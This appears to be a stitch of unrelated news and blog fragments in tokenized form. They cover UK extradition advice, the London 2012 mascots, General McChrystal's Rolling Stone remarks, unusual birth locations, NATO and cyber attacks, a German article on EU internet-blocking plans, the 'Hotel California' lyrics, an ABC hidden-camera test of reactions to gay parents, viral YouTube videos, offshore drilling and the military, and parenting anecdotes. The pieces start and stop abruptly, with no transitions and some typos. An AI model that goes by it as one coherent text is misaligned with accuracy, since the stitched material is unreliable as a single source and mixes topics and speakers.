Legal advice obtained from human rights QC Tim Owen and Julian Knowles , one of the UK's leading extradition lawyers , by the Daily Mail said : ' It is plain that the Home Secretary has the power - and indeed the duty - to intervene in any extradition case even after the court process has ended if the evidence establishes that there is a real risk of a human rights breach should extradition proceed . '
Well , it 's not a lion .
That was the preferred choice of people who contributed to my last post - but that was , of course , before Wenlock and Mandeville were unveiled before the nation .
Now we can see what they 're like :
Mandeviile and Wenlock
We also know the story of how they came into being - from steel being manufactured in Bolton for the Olympic Stadium .
You can see the film telling the tale on the London 2012 website .
Now the mascots feel the need to be in London for 2012 - and the creative teams are working on the journey they 'll make to be there in time for the Games .
As I 've said before , the mascots are entirely owned by the London Organising Committee ( Locog ) .
But we 've been aware for some time of what was being planned and - if creatures made from steel can be said to evolve - we 've followed their evolution .
So do I have a view on them ?
Well , in this case it 's irrelevant what I think .
The judges are the people of Britain and beyond .
But what I would say is that , as a principle , we should encourage innovation .
The point about many of the things we now take for granted - like the very idea of mascots - is that they were once pioneering and fresh ideas .
Whatever you think about London 2012 so far - and I note that many people are still not won over by the logo - it 's showing a willingness to take creative risks .
As our sports editor David Bond commented in his blog , after the controversy over the logo there might have been a temptation to play safe .
But the organisers have n't done that .
Instead , they 're talking about something they hope will inspire children in particular and bring home the message of sport and 2012 .
Anyway , it 's now over to you .
Tell us what you think - and I suspect our friends over at Locog will be having a look at your reaction , too .
Barack Obama will confront General Stanley McChrystal at the White House tomorrow as he decides whether to sack the commander of US and Nato forces in Afghanistan over disparaging and " contemptuous " remarks about senior administration officials , including the president himself .
The White House said " all options are on the table " after an " angry " Obama summoned McChrystal to Washington to explain quotes in the latest issue of Rolling Stone magazine in which the general and his senior aides accuse the US ambassador to Afghanistan of undermining the war , call the president 's national security adviser " a joke " and mock Joe Biden , the vice - president .
There is also indirect criticism of the president as " uncomfortable and intimidated " by senior military officials .
Obama said he is considering McChrystal 's future .
" I think it 's clear that the article in which he and his team appeared showed poor judgment .
But I also want to make sure I talk to him directly before I make any final decisions , " he said .
The president added that his decision would be based on what is best for making a success of the war in Afghanistan and that he would be consulting US allies including David Cameron .
However , the mood appeared to be shifting against McChrystal .
Earlier the White House spokesman , Robert Gibbs , declined to give assurances about the general 's position .
He said US efforts in Afghanistan were bigger than one man and that McChrystal was not indispensable .
The general apologised in person and by phone to some of those criticised and issued a statement admitting " a mistake reflecting poor judgment " .
" I have enormous respect and admiration for President Obama and his national security team , " McChrystal said .
But it is not clear whether that will be enough to save McChrystal 's job after what is the latest of a series of political blunders .
A leading Democratic member of Congress , Dave Obey , chairman of the House appropriations committee , called for him to be sacked .
But the general had the backing of the Afghan president , Hamid Karzai , who said he " strongly supports General McChrystal and his strategy in Afghanistan and believes he is the best commander the United States has sent to Afghanistan over the last nine years " .
In the Rolling Stone article , entitled The Runaway General , McChrystal 's aides are quoted as saying that he was less than impressed by Obama from the start .
The general is described as believing the president looked " uncomfortable and intimidated " among senior military officers .
McChrystal was also " disappointed " that the president " did n't know anything about him " during their early meetings .
The general mocks Biden , with whom he crossed swords over counterterrorism strategy .
" Are you asking about Vice - President Biden ? " McChrystal said .
" Who 's that ? "
A top adviser responds : " Biden ?
Did you say ' Bite me ' ? "
But the most stinging criticism is of other senior American officials with responsibility for what is now America 's longest war , including the US ambassador to Kabul , Karl Eikenberry , Obama 's special representative to Afghanistan , Richard Holbrooke , and the president 's national security adviser , Jim Jones .
Rolling Stone quotes McChrystal 's aides as calling Jones " a clown " who is " stuck in 1985 " .
Holbrooke is described as being " like a wounded animal " .
" Holbrooke keeps hearing rumours that he 's going to get fired , so that makes him dangerous , " said an aide .
The magazine describes how McChrystal at one point checks his BlackBerry .
" Oh , not another email from Holbrooke , " he said .
" I do n't even want to open it . "
Rolling Stone reports that Eikenberry cannot stand it that his former subordinate is now in charge .
Earlier this year , the New York Times published a scathing critique by Eikenberry , a general in Afghanistan for three years early in the war , of McChrystal 's military strategy .
It criticised Karzai and warned that the US risked becoming ever more deeply engaged , with no way to extricate itself .
McChrystal told Rolling Stone he felt " betrayed " by the leak and questioned Eikenberry 's motives : " Here 's one that covers his flank for the history books .
Now if we fail , they can say ' I told you so ' . "
The aides also criticise leading politicians , including Senators John McCain and John Kerry , for turning up in Afghanistan , criticising Karzai and then getting back to Washington for the Sunday talk shows .
But the secretary of state , Hillary Clinton , is praised by the general 's aides for watching his back and giving him " what he needs " .
Rolling Stone said the general was present when many of the comments quoted were made by his aides .
The entire tone of the article has infuriated the White House , but the president now faces a dilemma .
Obama became the first president in more than 50 years to sack a top general in wartime when he removed the then US commander in Afghanistan , David McKiernan , and replaced him with McChrystal .
To fire McChrystal now would suggest misjudgment by the president as well as removing the architect of an Afghan military strategy that is far from complete .
But it may be politically difficult to leave in place a general who has shown such public lack of confidence in those appointed by the White House to work with him .
McChrystal did not make any friends at the White House when his confidential report urging Obama to send 40,000 more troops to Afghanistan leaked .
The administration felt that the general was trying to strongarm the president by making him look weak if he did not agree .
Obama did agree to most of McChrystal 's request , including another 30,000 troops .
What McChrystal said
It describes how , even though the general voted for Barack Obama , the two failed to connect .
McChrystal thought Obama looked " uncomfortable and intimidated " by the roomful of military brass at their first meeting .
A second , one - onto - one encounter at the White House did not go much better .
" Obama clearly did n't know anything about him , who he was .
Here 's the guy who 's going to run his fucking war , but he did n't seem very engaged .
The boss was pretty disappointed , " an aide to McChrystal told the magazine .
Later , McChrystal objected to going to an official Nato dinner in Paris : " I 'd rather have my ass kicked by a roomful of people than go out to this dinner . "
One of the aides was asked by Rolling Stone who the dinner was with .
" Some French minister , " he replied .
" It 's fucking gay . "
The article describes the behaviour of McChrystal and his aides , who call themselves Team America , at an Irish bar in Parisare were reportedly drunk , while two officers did an Irish jig , mixed with steps from a traditional Afghan wedding dance .
They were singing a slurred song about Afghanistan .
McChrystal said : " I 'd die for them .
And they 'd die for me . "
An unnamed British officer is quoted as saying : " The fucking lads love Stan McChrystal .
You'd be out in Somewhere , Iraq , and someone would take a knee beside you and a corporal would be like ' Who the fuck is that ? '
And it 's fucking Stan McChrystal . "
The article relates the story of a 25 - year - old staff sergeant , Israel Arroyo , who sent an email to McChrystal from the front line in Afghanistan : " I am writing because it was said you do n't care about the troops and have made it harder to defend ourselves " .
The general replied within hours : " I 'm saddened by accusations that I do n't care about soldiers , as it is something I suspect any soldier takes both personally and professionally – at least I do .
But I know perceptions depend upon your perspective at the time , and I respect that every soldier 's view is his own " .
McChrystal then turned up at Arroyo's base and went on foot patrol with him in an attempt to understand what the soldier meant .
During a later visit to the same forward base after a soldier is killed , another soldier said to McChrystal : " Sir , some of the guys here , sir , think we 're losing , sir . "
The general tried to explain his counter - insurgency strategy but afterwards said he did not think it had been been persuasive .
" This is the philosophical part that works with thinktanks .
But it does n't get the same reception from infantry companies , " he said .
A senior aide to McChrystal said that the war would be even more unpopular with Americans if they thought about it : " If Americans pulled back and started paying attention to this war , it would become even less popular . "

Well , I 'm a week away from my due date , and it does n't look like our bundle of joy is going anywhere anytime soon .
But that has n't stopped me from having horrifying visions of getting stuck on an elevator and going into labor or being otherwise unable to make it to the hospital 10 minutes away from our house .
Maybe it was a bad idea to research these unexpected places to give birth " ¦
1 . In a subway station .
I can't think of a less sanitary place to give birth , can you ?
In 2008 , Francine Alfontent and her husband were at the East Broadway stop headed to the hospital when the baby decided it was done cooking .
The mother gave birth among a circle of New Yorkers who donated clothing , helped time contractions and gave up a cheer when the baby came out healthy .
2 . In an airplane .
This was one of those , " Is there a doctor on the plane ? "  situations , and thankfully , there was .
A doctor and two nurses , to be exact .
In December 2009 , a woman about a month out from her due date gave birth on a Southwest flight from Chicago Midway to Salt Lake City .
When the baby was born , it was announced it to the 122 other curious passengers on board : " We now have a new passenger , "  the pilot said over the intercom before making an emergency landing in Denver .
3 . In a mechanic 's shop .
This one just happened !
Earlier this month in Cambridge , Mass. , a woman went to an instant oil - change Valvoline shop to check some routine car maintenance off of her to - do list before the baby came .
Instead , she ended up giving birth in the backseat of her SUV .
Police and paramedics were called to the scene where the baby had already made its debut .
It was n't breathing .
Policeman Steve Allen hit the baby on the back twice and cleared its mouth of blockage , which cleared things right up .
Everyone is reported to be doing well now .
I do n't know about you , but I 'm thinking free oil changes for life .
4 . In a Port - O - Potty .
What is it about Cambridge ?
In the same town as the Valvoline baby but nearly a year earlier , a 44 - year - old woman retreated to a Port - O - Potty to have her baby " ¦ and then dropped the newborn little girl in the tank and left to smoke a cigarette .
When someone else approached the toilet , the new mother told them to stay out because she had just given birth .
When the man called 911 , she retrieved the baby from the toilet .
She was charged with first and second degree child abuse and reckless endangerment and later told officials that she did n't know she was pregnant .
The baby survived and social services took custody of her when she was allowed to leave the hospital .
5 . In a tree .
In 2000 , about a million people in Mozambique were forced from their homes when floodwaters ravaged the country .
Or make that a million and one .
A Sophia Pedro lived in a treetop for four days , waiting for her rescue and hoping that it would come before her baby did .
Rescue did come , but it was moments too late " “ just minutes after the woman gave birth in the treetop , medics descended from a helicopter to retrieve them and cut the umbilical cord .
Sophia and her daughter both recovered just fine .
6. At Sesame Place .
But she was n't exactly surrounded by Elmo and Big Bird .
A woman from Manhattan was visiting the Sesame Street - themed park in 2008 and had only been there for about 20 minutes when her water broke .
" It happened so fast .
I did n't have pain , just shock , "  Takia Mann said .
Sesame Place gave Mann and her family ( she was there with her other two children ) season passes and sent Elmo and Abby Cadabby to visit the newest little Mann at the hospital .
7 . In a rickshaw .
A Pakistani woman got caught in a traffic jam in February when President Asif Ali Zardari 's motorcade went through Quetta .
The woman 's brother hired a rickshaw to get her to the hospital and pleaded with police to let them pass because his sister was due to give birth at any second .
They declined the request , and the baby was born in the rickshaw .
8. At ESPN Zone .
A 24 - year - old woman was visiting the ESPN Zone at Downtown Disney in Anaheim in 2005 when she had the sudden urge to go to the bathroom .
Bad .
Turned out it was n't bad chicken wings " “ she was in labor and gave birth in the second - floor bathroom at the eatery .
9 . At Wal - Mart .
It sounds like a MacGyver episode , but when a woman went into labor at a Lake City , Florida , Wal - Mart , employees sprang into action and used items from the store to assist her .
And you can watch !
Do n't worry , it 's not graphic " “ it 's interviews with the employees who were there coupled with some grainy security footage .
10 .
At the post office .
Maybe it 's not just Cambridge , Mass . " “ a woman in Cambridgeshire , England , gave birth to a baby girl named Dulce last year when she stopped at the post office to get more minutes on her cell phone .
The baby was weighed on a postal scale where she topped out at 5 pounds , 15 ounces .
" We worked out that 's the equivalent of an Â £ 8.22 first class parcel , "  postmaster Paul Childs said .
OK " “ hit me with your most horrifying tale .
Did your sister give birth in a taxi ?
Do you know someone from your hometown who went into labor while standing in line at McDonald's ?
Let 's see who has the best story , and I will do my best to have the most boring , unimaginative birth story ever .

As the threat of cyber war and cyberterrorism is evermore real in this twenty - first century , traditional military powers and alliances have to find ways to cope with computerized attacks .
NATO now ponders returning fire , according to Defense Tech .
The group of experts headed by former US Secretary of State Madeleine Albright that is rethinking NATO ’s future recently opined that a cyber attack targeting the critical infrastructure of an alliance member should equate to an armed attack , justifying retaliation .
Several NATO members have come under such attack in recent years , most of which were traced back to Russia .
NATO commanders appear to be of a similar mindset .
Defense
Tech reports that multiple sources say that NATO is considering the use of military force against enemies who launch cyber attacks against its member states .
“ Many world leaders now fear that future cyber attacks will escalate up into a full - blown cyber war and possibly evolve into a conventional form of conflict . ”
Such an assault would then invoke the famed Article 5 of the North Atlantic Treaty which prescribed that “ an armed attack against one or more ” NATO states “ shall be considered an attack against them all . ”
Article 5 was never invoked before 9/11 and it seems unlikely that a mild , relatively limited cyber attack would instantly rattle up all of NATO for war .
But as the nature of warfare changes , so must the alliance .
Considering a heavy cyber attack no less severe than a conventional offensive sends a clear signal to cyberterrorists affiliated with traditional states that their actions cannot be without consequence .
The difficulty is linking cyberterrorism to states , as is the case with terrorism in general .
Retaliation should follow attack , but against whom to retaliate ?
“ One thing is certain , ” notes Defense Tech : “ the cyber threat situation is very dynamic and the proliferation of cyber weapons persists and capabilities of cyber weapons continue to increase . ”

Um ihren Vorschlag für Internetsperren gegen Kinderpornos durchzubringen , bezahlt die EU Jugendschutzorganisationen .
In Großbritannien wird bereits eine komplette Abhörung des Internetverkehrs getestet .
Seit Cecilia Malmström , Innenkommissarin der EU , ihren Vorschlag zur Einführung von Internet - Sperrfiltern gegen kinderpornografisches Material vorgestellt hat , arbeitet die Kommission fleißig daran , dass der Vorschlag Realität wird .
Nach Angaben von Computerworld wurden 300.000 Euro an Jugenschutzgruppen in ganz Europa verteilt , um für den Netzsperren - Plan Stimmung zu machen .
Unter anderem soll die European NGO Alliance for Child Safety Online ( ENACSO ) im Europaparlament direkt eine Lobbying - Veranstaltung abhalten , um Abgeordnete zu beeinflussen , für Netzsperren zu stimmen .
Die Kommission will Organisationen wie ENACSO nutzen , um das Argument , die Zivilgesellschaft hätte kein Problem mit Netzsperren , durchbringen zu können .
Ein krasses Gegenbeispiel dafür ist der deutsche Verein MOGIS ( Missbrauchsopfer gegen Internetsperren ) .
Er setzt sich vehement gegen die Sperrfilter ein und fordert die Löschung von Darstellungen von Kindesmisshandlung sowie mehr Prävention .
IT - Industrie hält sich bedeckt
Mittlerweile hat sich erstmals ein Vertreter der IT - Industrie offiziell zu den Plänen von Malmström geäußert .
Ed Black , Präsident der Computer & Communications Industry Association ( CCIA ) nennt den Vorschlag einen Gefahr für die Offenheit des Internet .
Seine Stimme verhallt derzeit recht einsam .
Denn obwohl der CCIA Branchengrößen wie Google , Microsoft , Yahoo und AMD angehören , hat bisher noch keines der Unternehmen sich öffentlich getraut , Stellung zu beziehen .
" Mit solchen Gesetzen wird das offene Netz mit 1000 Schnitten sterben " , warnt Black .
Die massive Zensur , die etwa China praktiziere sei nichts im Vergleich zu dem , was jetzt langfristig für Konsequenzen drohen könnten , würde Malmströms Vorschlag Gesetz werden .
Musiklobby froh über Kinderpornos
Erst kürzlich warnte der EU - Abgeordnete Christian Engström davor , dass Netzsperren der Unterhaltungsindustrie als willkommenes Mittel dienen , um Urheberrechtsfilter zu installieren .
Ein Anwalt der Musiklobby IFPI soll laut Engström schon 2007 bei einer Veranstaltung gesagt haben , dass Kinderpornos " großartig " seien , da man über sie Politiker zur Einführung von Netzsperren bewegen könne .
Sobald sich die Technik bei den Darstellungen von Kindesmisshandlung erfolgreich bewiesen hat , könne man sie auf andere Bereiche ausdehnen , so der Gedanke des Anwalts .
Neben Engström warnen auch andere EU - Parlamentarier vor dem Plan , ebenso zahlreiche Bürgerrechtsgruppierungen .
Ob es für sie aber eine Mehrheit im Parlament gibt , ist derzeit ungewiss .
Komplette Abhörverfahren in Testphase
In Europa blockieren bereits Großbritannien , Dänemark und Italien diverse Websites .
Großbritannien testet derzeit sogar sogenannte Deep Packet Inspection ( DPI ) .
Dabei wird nicht nur untersucht , woher die Daten stammen und wann sie geschickt wurden , sondern der komplette Inhalte wird geprüft .
Sie ist um einiges aufwendiger als andere Filterverfahren .
Würden Staaten flächendeckend DPI für den gesamten Internetverkehr einsetzen , wäre das gleichzusetzen mit einer konstanten Abhörung aller Telefongespräche - und zwar der Inhalte , nicht wie derzeit üblich nur die Verbindungsdaten im Rahmen der Vorratsdatenspeicherung .
Im Einsatz ist DPI derzeit zwar schon in vielen Unternehmen und auch Ländern , allerdings wird die Technik noch nicht zur großflächigen Blockade von Websites oder direkter Zensur eingesetzt - abgesehen von China und dem Iran .
Deutschland setzt auf Löschen statt Sperren
Als einziges Land vehement gegen Netzsperren ausgesprochen hat sich bisher nur Deutschland .
Hier war im Rahmen des heftig umstrittenen Zugangserschwerungsgesetzes geplant gewesen , über kinderpornografische Websites ein Stoppschild zu legen , um Täter abzuschrecken .
Der Plan wurde ( unter anderem wegen seiner Ineffizienz ) auf Eis gelegt , die aktuelle Bundesregierung hat beschlossen , das Gesetz nicht umzusetzen .
Stattdessen wird eine weit effektivere Methode verfolgt : Löschen statt Sperren .
Sobald bekannt wird , wo sich kinderpornografisches Material befindet , werden die Provider ermittelt und dazu veranlasst , es zu löschen .
Liegen die Server im Ausland , werden die entsprechenden Behörden informiert .
Ein weiteres Land , das vom Netzsperren - Plan wieder Abstand nahm , ist Australien , wie Heise berichtet .
Allerdings wird dessen Entscheidung kaum Einfluss auf die Entwicklung in der EU haben .
Österreichs Provider aktiv gegen Kinderpornos
In Österreich arbeitet die Vereinigung der Internetprovider ISPA mit dem Projekt Stopline aktiv gegen Kinderpornografie und Neonazismus im Internet .
Werden entsprechende Websites entdeckt , kann man sie dort melden .
Befindet sich der Ursprung in Österreich , wird ähnlich wie in Deutschland vorgegangen und der I nhalt entfernt .
Für Quellen im Ausland werden die Daten an INHOPE , einen internationalen Zusammenschluss von 30 Ländern , der als Dachorganisation für Internet - Beschwerden gilt , weitergeleitet .
Die EU selbst hat INHOPE bereits 1999 ins Leben gerufen , um den genannten Problemen Herr zu werden .
Wie im Jahresbericht 2009 von Stopline zu sehen ist , stammt der Großteil des gemeldeten Materials aus den USA - die von den EU - Gesetzen nicht betroffen wären .
Sperren verhindern Misshandlung nicht
Zahlreiche Bürgerrechts - und Jugendschutzorganisationen wie MOGIS plädieren für mehr Prävention , anstatt das vorhandene Problem per Filter einfach auszublenden .
Die Probleme sollten an der Wurzel angepackt und nicht erst Symptome über leicht zu überwindende Maßnahmen wie Netzsperren kaschiert werden , heißt es .
Anders sieht das ECPAT Österreich , ein Verein der Teil einer internationalen Organisation ist und gegen Kinderpornografie , - handel und - prostitution kämpft .
Die Organisation sieht Sperren als probates Mittel , um die Verbreitung des Materials zu stoppen .
Allerdings nur im Rahmen eines Gesamtpakets , das auch Präventionsmaßnahmen inkludiert .
Eines steht aber fest : Das Problem der Kindesmisshandlung beginnt nicht im Internet .
Dort offenbaren sich nur ihre erschreckenden Auswüchse .
When interpreted at face value , this is just a straightforward reference to a desert plant called colitas .
Deep Thought
But this " colitas " has been the source of much speculation .
The " desert flower " thing certainly works , though people disagree over exactly which flower Henley might have been referring to .
The other suggestion , preferred by people who like to find hidden drug references in every song ( what 's up with those people ) , is that " colitas " refers to a part of the marijuana plant .
As in , the speaker has been smoking dope , so he obviously smells it in his car .
To which we respond : quite possible .
Drugs were a big part of the Eagles ' lives during that period .
But they do n't otherwise figure much into this song , so we 'll go with flowers for now .
Waiter Harassing Gay Parents : What Would You Do ?
How would you react if you saw waiter harassing a gay couple with two children ?
May 18 , 2010  --
While enjoying a bite to eat at a local diner , you overhear a waiter giving two women at the next table a hard time .
" Are you sisters ? " he asks them .
" Are your husbands joining you ? "
At first , he just seems to be a nuisance but then he gets personal .
" Oh , you 're lesbians ? " he exclaims .
" What about your kids ?
Do n't they need daddies ? "
The two women and their children are shocked and embarrassed .
As they try to place an order , the waiter gets even more incensed and finally asks them to leave .
As the family of four gets up to go , they catch your eye .
What Would You Do ? Come to the defense of the gay couple and their small children ?
Or look the other way ?
We decided to put America 's comfort level with gay parents to the test and set out for a diner in Sheepshead Bay , Brooklyn , N.Y. , to find out .
We rigged the restaurant with hidden cameras and hired actors Traci Hovel and Lisa Birnbaum to play our lesbian couple .
Marina March , 10 , and Anthony Ippolito , 9 , played their two children .
Brian Sheridan played our homophobic waiter .
Members of COLAGE.org , an organization by and for people with lesbian , gay , bisexual , transgender or queer parents , joined us in the control room .
At first , no one seemed to notice our waiter 's incessant questioning -- even when he got more insulting and outspoken .
Instead , patrons focused on their breakfast and ignored the commotion .
As Brian asked Traci and Lisa to leave the diner , he passed by a couple seated next to them .
" You know what ? " the man volunteered to our homophobic waiter .
" I do n't like it .
I do n't believe in it .
But as long as they 're not sitting there kissing while I 'm sitting here with my daughter ... "
Then " What Would You Do ? " host John Quinones introduced himself and explained that it was all an experiment .
" I felt bad for them , " the man told Quinones .
" I could n't believe [ it ] ! "
As our hidden cameras rolled again , patrons noticed Brian 's homophobic tirade but no one seemed to come to the aid of our gay family .
In scene after scene , people said they did n't get involved because they thought it was n't their business and the family could fend for themselves .
Gay Parents : What Would You Do ?
We swapped actors -- from lesbians to gay dads to see if it would elicit some response .
Still , few spoke up .
But then we met Randi and Kevin Nash , married for 20 years .
As soon as our intolerant waiter began his badgering , Randi 's face said it all .
She sat open - mouthed and astonished by what she was hearing .
When the waiter finally stepped away , Randi and Kevin both offered their support to our gay couple -- telling them they'd " never seen anything like it in their life . "
Everyone shook hands as Brian returned and tried to befriend the Nashes .
They were having none of it .
" Is there anything I can do ? " Brian asked them .
" Yes there is , " Kevin said .
" Turn around and walk away . "
Randi added that they are accepting of all people and asked Brian not to talk to them .
When ABC's John Quinones walked in with a camera crew , Kevin told him it angered him to his core .
As the day wore on , several other diners came to our gay family 's defense -- demanding that Brian stop discriminating against them .
But what would happen if our lesbian moms went from lipstick to flannel -- with one mom dressed in a tie and jacket ?
Many gay couples say that masculine dress triggers even more intolerance .
Would a simple change of appearance make a difference in how people react ?

( CNN ) -- Judson Laipply did n't expect much from his cheaply made video , " Evolution of Dance . "
It was a calling card , a way for the " inspirational comedian " to get noticed , when he uploaded it to YouTube on April 6 , 2006 .
Four years and almost 150 million YouTube views later , it 's changed his life .
Laipply , 34 , has done the dance -- a medley of decades - spanning moves , from Elvis to OutKast -- for his hometown Cleveland Cavaliers and at an NBA playoff halftime show .
He 's performed at the Technical Emmys .
He appeared in the Weezer video " Pork and Beans " ( a video that featured several viral video stars , including the Mentos - soda spraying guys and Chris " Leave Britney Alone " Crocker ) .
" I was very comfortable where I was at , but when the video hit , all of the things that came with that -- the recognition , the TV shows , all those kinds of opportunities -- only added to what I had already been building on , " he says .
" It probably gave me about a 10 - year career boost . "
Laipply 's story is the great viral video fantasy .
It 's the lightning strike that makes famous a young boy recovering from dental surgery , immortalizes a wedding party and offers performers exposure beyond their wildest dreams .
It 's also completely unpredictable , says Tim Hwang , an Internet culture expert and the founder of ROFLCon , a gathering of online stars .
" The big ironic thing is that trying too hard does n't get you far , " he says .
" In fact , trying too hard seems to dampen the ability to get you passed around the Web . "
In fact , he adds , sometimes it 's better to look like a fool : " A lot of viral videos come out of horrendous failure .
...
If you fail really , really terribly , the Internet might give you a shot at being a viral star . "
There 's no lack of hopefuls .
Every 60 seconds , 24 hours ' worth of new video is uploaded to YouTube alone .
As Matt Cutler , CMO of the online video data and analysis firm Visible Measures , observes , there are hundreds of millions of videos uploaded , embedded and cross-posted all over the Web ; his company has tracked statistics on more than a trillion page views .
Hwang says many viral videos tend to " percolate to a certain point " before finding their way to a site such as Buzzfeed , 4 chan or BoingBoing , at which point they get a dose of pixelated rocket fuel and are suddenly everywhere .
Indeed , some videos may receive virtually no traffic for weeks -- until attracting the curiosity of a well - read blog , at which point things just take off .
' That 's unbelievable '
That was Laipply 's experience .
Indeed , he created " Evolution of Dance " in 2002 , three years before YouTube was founded , and did n't record the piece until 2006 , at which point he put it on his MySpace page for his 500 or so fans .
After adding it to YouTube , he forgot about it for about a month , until noticing he'd received six or seven e-mails from the site about comments on his piece .
By then , the piece had 30,000 views .
" I remember being like , ' Wow !
That 's unbelievable , ' " he says .
It got better .
The next day he had 15 more e-mails and the page was up to 90,000 views .
Then he went on a trip for three days with no Web or cell phone access .
" I get back and turn on my cell phone and it immediately starts popping , with text messages and phone calls and my voice mailbox is full , and almost all of them were my friends saying , ' What the hell 's going on ?
I just got an e-mail , and it's YOU , ' " he recalls .
His brother informed him the video was up to 300,000 views , and from that point , " every single day , it was more and more and more , " he says .
Naturally , these are the kinds of numbers advertisers would love to have -- especially given the low price of entry .
Some YouTube entries are from the usual suspects -- Nike , Apple , well - known names that also spend a fortune on TV advertising and have combined the two effectively .
But the democratic nature of the Web allows shrewd small companies to play the same game , says Cutler , whose company compiles a viral video chart for the trade publication Ad Age .
" In specific categories you have smaller , upstart players who are much more aggressive in the medium , " he says , mentioning that the fast - food chain Carl 's Jr. , for one , has " punched above their weight because they 've been fairly innovative when it comes to social video . "
YouTube itself has gotten into the act .
The Google - owned company sells advertising connected to its videos and maintains a partner program that allows users to make money off their page views , says YouTube Product Manager Shenaz Zack .
Though the program can favor people who supply regular content to YouTube , such as a makeup artist who uploads a regular lesson , viral video creators with one big hit can hop on board , Zack says -- and YouTube does n't see itself in competition with other services .
" The 12 - year - old who did Lady Gaga [ Greyson Chance , who performed the singer 's ' Paparazzi ' at a talent show ] had uploaded to Facebook and other sites , " she says .
" It 's all based on community . "
Google 's new initiative , Google TV , will further the goal , creating " a channel of me , " says Zack .
The " me channels , " no matter how limited , can be quite lucrative .
Comedian Shane Dawson makes his living through his YouTube - posted videos ; David DeVore , who posted " David After Dentist , " told CNN his family has made in the " low six figures " off the video .
Laipply has been able to up his fee and cut back his schedule .
' No one really has the keys '
However , there are limits .
Politicians can gain visibility with viral videos , but also mockery .
And , though the public will seize on clever advertisements and make them viral , the ads have to be " authentic , " say experts .
An apparently grass - roots viral video that 's later revealed to be the product of a big company can prompt a backlash , says Cutler .
Hwang , who consults with The Barbarian Group digital ad agency -- which is responsible for the " Subservient Chicken " Burger King site , that , early on , hid its sponsorship -- observes that corporations are still finding their way around viral videos .
" Right now no one really has the keys , " he says .
" There are some people who seem to have a really good knack at it , but if you ask them what they do , their guidance would be extremely broad and extremely vague . "
In fact , the reason Hwang began advising The Barbarian Group was that he had been doing analysis for Harvard 's Berkman Center for Internet and Society , trying to quantify elements of Web usage .
He believes the time is coming when video creators will be able to know what works , and viral videos will become more predictable -- just as music sites parsing songs are trying to determine , mathematically , what makes a hit .
" We have just enormous amounts of data now about what people do online , " he says .
" I 'm fairly confident that , as we explore that data more and more , we 'll understand how that process goes .
And at some point , there will be a kind of data - driven science around hacking culture , or hacking social systems .
The data will probably end up bringing better results than the whole host of viral video experts and social video experts you can get into a room . "
In the meantime -- or should that be meme - time ? -- video posters hoping for instant stardom should n't expect much .
It 's hard enough , after all , to capture lightning in a bottle even once .
And if you do , be careful what you wish for .
Even in a fame - obsessed culture , your success can be as short - lived as your anonymity .
" It would have been very , very easy after the success of that video to go out to L.A. and parlay that into something different than what I was doing , " says Laipply .
" But if you look at anyone who ever has instant success like that , and then they try to parlay it into something else , it 's very rarely successful , because you have n't spent the years learning and building and getting the talent that you need . "

Now we have a leak to go with that spill .
It ’s been roughly a month since BP ’s oil - rig disaster , and as our on - the - ground reporter Mac McClelland showed yesterday , the Gulf of Mexico is now starting to resemble the pit of a Jiffy Lube .
There ’s been no shortage of opprobrium heaped on the energy lobby and its political apologists of late , with even erstwhile conservatives criticizing the “ drill , baby , drill ” crowd as anti-environment and anti-economic - prosperity .
How could it get worse for ( mainly Republican ) champions of lubrication laissez faire ?
How about if it ’s discovered that outer continental shelf drilling is also anti-national - security ?
That ’s exactly what the Department of Defense appears to have done in a leaked portion of its new report ( PDF ) , appropriately titled “ Outer Continental Shelf ( OCS ) : Military Activities and Future Oil & Gas Development . ”
You see , the new conservative Virginia governor and shadow commander in chief , Bob McDonnell , longs to penetrate Virginia ’s sea plain with hard probes for profit .
His plan was to make 4,500 square miles of ocean available to oil drillers by 2010 .
But !
According to the Washington Post :
The Defense Department report , concluded in March but released in part Tuesday by Rep. James P. Moran Jr. ( D - Va. ) , a drilling opponent , indicates that drilling would interfere with military activities … in 72 percent of the 3 million acres covered by the lease sale and that it could be allowed only with restrictions in 6 percent of the area .
As a former sailor who ’s operated out of Norfolk , Virginia — the world ’s largest naval installation — I can attest that its sea lanes are rather critical to effective military activities .
Ships need to move through quickly and safely when deploying , and that process gets harder when additional surface contacts and navigational hazards are thrown into the brew .
( Submarines , which also operate extensively in the area , face a special three - dimensional , life - or - death challenge with undersea drilling infrastructures . )
Fleet training exercises , tactical readiness exams , sea trials of new ships , and many other classified but important endeavors begin off the Tidewater coast .
In fact , Norfolk hosts five aircraft carrier groups — one of which , the USS Truman carrier strike group , just departed today for the Persian Gulf .
Pretty safe to assume they keep a tight movement schedule to get to a war zone .
Do you really want your Hummer ’s hydrocarbon hunger to cost them an extra day on that trip ?
Now , Big Oil was n’t totally unprepared for this line of attack .
One of its mouthpieces , Securing America ’s Future Energy ( SAFE ) , has a report on its website extolling how the military thinks offshore drilling is totally hunky dory for its operations .
The report ’s military “ experts ” were retired paid consultants .
But here ’s the really fun part :
The oil flacks ’ report , which was published in January , did n’t focus on the Virginia shore , where it would interfere most with US defense readiness :
It focused on the Eastern Gulf of Mexico from Pensacola , Florida , to Key West .
Where there ’s , you know , an expanding oil plume .
Rest assured MoJo will be on the phone to NAS P’cola , Eglin Air Force Base , and NAS Key West next week to see if they ’ve scrubbed any flight , surface , or other training ops — or had resources diverted to combat the slick .
This should probably matter to strong - on - defense neocons , paleocons , and the like for obvious reasons of principle .
But the GOP also has compelling political reasons to kill the drill :
You do n’t want to take on the DOD , which usually ( and in this case , rightly ) gets what it wants .
As the AP reports :
The Pentagon cannot unilaterally veto drilling proposals , but Dorothy Robyn , deputy undersecretary of defense for installations and environment , said the Defense and Interior departments have a long history of cooperation , and drilling has never taken place in an area objected to by the military .
“ We have every expectation that if we said we need an area … that they would fully honor that , ” Ms. Robyn said .
Dear reader , expect a follow - up soon .

I ’m a culinary student so I keep random shit , like food dye , in my car .
My son decided to dump several ounces of it all over my daughter , including her hair , just as I was on my way to drop them off at a sitter ’s for the evening so I could go to a concert that night .
I was late to the concert .
It ’s a rainy Saturday , my wife is 39.5 weeks pregnant with our second child , and she ’s begun to have contractions .
They are spaced far apart , so it might be hours or even a day until we have to go to the hospital .
We decide to take our son to Barnes and Noble where he can play with the train table in the children ’s section .
I drop my wife and son at the front door and go and park the car as it is raining .
Before I even walk in the door , my wife calls my cell and asks if there is a towel in the car .
Immediately , I think “ her water broke ! ”
So I run back to the car and look to no avail .
I run into the store only to realize that an entire section of the children ’s area is now roped off and the floor is liberally covered with something to absorb .. well … the moisture .
Our son was so excited about the train table that he lost control of his …. bladder .
Who knew he had a bladder the size of a water buffalo ?!
So there we have it .
